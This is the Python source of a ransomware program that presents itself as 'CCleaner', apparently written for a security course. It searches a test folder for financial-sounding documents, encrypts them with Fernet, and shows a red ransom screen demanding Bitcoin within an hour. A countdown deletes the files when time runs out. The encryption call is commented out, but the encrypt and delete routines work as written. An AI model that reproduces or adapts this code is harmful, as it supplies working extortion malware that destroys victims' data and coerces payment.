import os
from tkinter import *
from tkinter import messagebox
from datetime import datetime
from PIL import ImageTk, Image
from cryptography.fernet import Fernet
import random

#Creates a list of files of certain extensions within the given folder, whose file names include keywords from the 'MoneyWords.txt' file in any form
def generate_file_list_keyword(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg','.xlsx')
    file_paths = []
    rfile = open('MoneyWords.txt', 'r')
    words = [line[:-1] for line in rfile]
    for root, dirs, files, in os.walk(path):
        for file in files:
            for w in words:
                file_name,file_ext = os.path.splitext(root+'\\'+file)
                if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
                        file_paths.append(root+'\\'+file)
    return file_paths

#Creates a list of files of certain extensions
def generate_file_list(path):
    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
    file_paths = []
    for root, dirs, files, in os.walk(path):
        for file in files:
            file_name,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encrypted_ext:
                file_paths.append(root+'\\'+file)
    return file_paths

#Creates fernet key
def create_key():
    key = Fernet.generate_key()
    crypter = Fernet(key)
    return crypter, key

#Writes fernet key to text file on the desktop
def write_key(key):
    if bitcoin_entry.get() >= how_many_bitcoins_do_we_want:
        with open(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt', 'wb') as filekey:
            filekey.write(key)
        messagebox.showinfo(title = 'Text File Created', message = "A text file has been created with the key for your files. Enter it into the input field below to get your files back. Thank you for your cooperation.")

#uses fernet key to encrypt all files in file_paths list
def encrypt_files(file_paths, fernet):
    for f in file_paths:
        #create encrypted version of the file
        with open(f, 'rb') as file:
            data = file.read()
        encrypted = fernet.encrypt(data)
        
        #overwrite the original with the new encrypted version
        os.remove(f)
        with open(f, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

#uses fernet key to decrypt all files in file_paths list
def decrypt_files(file_paths, fernet, key):
    if key_entry.get() == key.decode("utf-8"):
        global global_status
        global_status = 'Decrypted'
        for f in file_paths:
            #create decrypted version of the file
            with open(f, 'rb') as enc_file:
                decrypted = fernet.decrypt(enc_file.read())
        
            #overwrite the original with the new decrypted version
            with open(f, 'wb') as dec_file:
                dec_file.write(decrypted)

        #Removes filekey file from computer after the correct code is used to decrypt all files
        os.remove(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') + '\\filekey.txt')
        #
        messagebox.showinfo(title = 'Files Decrypted', message = 'Your files have been decrypted. Thank you for your cooperation. Have a nice day')
        root.destroy()

#Function to delete all files from the file path from the computer; used if time runs out and user has not sent money.
def delete_everything(file_paths):
    for f in file_paths:
        os.remove(f)

# GUI Stuff / Main Program Loop ==========================================================================================================================================================

#Creates and customizes GUI and is the main process
root = Tk()
root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
root.iconbitmap('ccleaner.ico')
root.geometry("1280x720")
root.configure(bg = 'red')
#Global variable to create the number of bitcoins we want user to send
how_many_bitcoins_do_we_want = str(random.randint(1,20))
global_status = 'Running'

#Calls functions to create the file paths of all files to encrypt
file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Desktop\\CECS378Test')
#Creates the Fernet object and the fernet encryption key
crypter, key = create_key()
#Calls function to encrypt all the files in the generated file paths using the 'crypter' Fernet object
#encrypt_files(file_paths, crypter)

#Variable math to determine the starting time for the countdown timer
curr_time = str(datetime.now())
end_time = str((int(curr_time[11:13]) + 1) % 24) + curr_time[13:19]
end_time_min = curr_time[11:14] + str((int(curr_time[14:16]) + 1) % 60) + curr_time[16:19]

# Countdown Timer Stuff ---------------------------------------------------------------
def update_time():
    format = '%H:%M:%S'
    now = (datetime.now()).strftime(format)
    string = datetime.strptime(end_time_min, format) - datetime.strptime(now, format)
    timer.config(text=string)
    if str(string) != '0:00:00':
        timer.after(1000,update_time)
    if str(string) == '0:00:00' and global_status == 'Running':
        delete_everything(file_paths)
        messagebox.showinfo(title = 'Files Deleted', message = 'The timer has reached zero, and we have not received any BitCoin from you. Your files have now been permanently deleted. Have a nice day.')

#Widget for creating the timer display
timer = Label(root, font=('Times New Roman', 70,'bold'), bg = 'red', fg = 'white')
timer.place(x = 495, y = 300)

#Function to initialize the timer
update_time()
# -------------------------------------------------------------------------------------

#Labels for the skull images around the GUI
skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
image_label1 = Label(image = skull_image, bg = 'red')
image_label2 = Label(image = skull_image, bg = 'red')
image_label3 = Label(image = skull_image, bg = 'red')
image_label4 = Label(image = skull_image, bg = 'red')
image_label1.place(x = 0, y = 0)
image_label2.place(x = 1051, y = 0)
image_label3.place(x = 0, y = 500)
image_label4.place(x = 1051, y = 500)

#Label for the main paragraph text on the GUI
main_text = Label(root, text="Your important financial files have just been encrypted.\nSend " +how_many_bitcoins_do_we_want + " BitCoin to us, or your files will be deleted and lost forever.\nYou have one hour.", font = ('Times New Roman', 24), fg = 'white', bg = 'red')
main_text.place(x = 217, y = 200)

#Widget for the entry box for input of the amount of bitcoin to send
bitcoin_entry = Entry(root, width = 30, borderwidth = 5)
bitcoin_entry.place(x = 465, y = 428)
bitcoin_entry.insert(0, "Enter Amount of Bitcoin to Send")

#Widget for the button that is pressed after inputting bitcoin amount to entry.
# Runs write_key() function if amount of bitcoin sent is greater than or equal to requested amount.
bitcoin_button = Button(root, text = "Send\nBitCoin", width = 10, height = 2, borderwidth = 5, font = ('Times New Roman', 15), command=lambda:write_key(key))
bitcoin_button.place(x = 685, y = 410)

#Widget for the entry box for input of the Fernet key to decrypt files.
key_entry = Entry(root, width = 50, borderwidth = 5)
key_entry.place(x = 481, y = 500)
key_entry.insert(0, "Enter Key Here")

#Widget for the button that is pressed after inputting Fernet key.
# Runs decrypt_files() function if Fernet key inputted matches the Fernet key generated at run time.
key_button = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18), command = lambda: decrypt_files(file_paths, crypter, key))
key_button.place(x = 546, y = 540)

#Message Box to prevent user from panic closing the program on running, so they don't keep files encrypted forever.
messagebox.showinfo(title = 'READ', message = "IMPORTANT. DO NOT CLOSE PROGRAM WITHOUT READING OR YOU WILL LOSE IMPORTANT FILES.")

# ====================================================================================================================================================================================

# Running main program loop
root.mainloop()